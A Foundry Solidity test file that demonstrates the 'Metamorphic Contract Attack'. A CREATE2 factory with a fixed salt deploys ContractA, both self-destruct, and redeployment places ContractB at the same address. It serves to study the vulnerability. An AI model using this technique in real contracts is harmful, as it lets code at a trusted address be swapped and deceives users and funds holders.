// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.22;

import {Test} from "forge-std/Test.sol";
import "../contracts/ContractA.sol";
import "../contracts/ContractB.sol";
import "../contracts/FactoryContract.sol";

/**
 * @title MetamorphicContract
 * @dev A test contract demonstrating a vulnerability known as the "Metamorphic Contract Attack."
 */
contract MetamorphicContract is Test {
    ContractA private a;
    ContractB private b;
    Factory private factory;

    /**
     * @dev Sets up the test environment by deploying a Factory contract and an instance of ContractA,
     * then triggers the self-destruct function of ContractA and the Factory.
     */
    function setUp() public {
        factory = new Factory{salt: keccak256(abi.encode("69"))}();
        a = ContractA(factory.createContractA());

        a.die();
        factory.die();
    }

    /**
     * @dev Tests the behavior of metamorphic contract attack by verifying if the code of ContractA and the Factory
     * were destroyed and then attempts to redeploy Factory and deploy another instance of ContractB.
     */
    function testMorphingContract() public {
        assertEq(address(a).code.length, 0);
        assertEq(address(factory).code.length, 0);

        factory = new Factory{salt: keccak256(abi.encode("69"))}();

        b = ContractB(factory.createContractB());
        assertEq(address(a), address(b));
    }
}
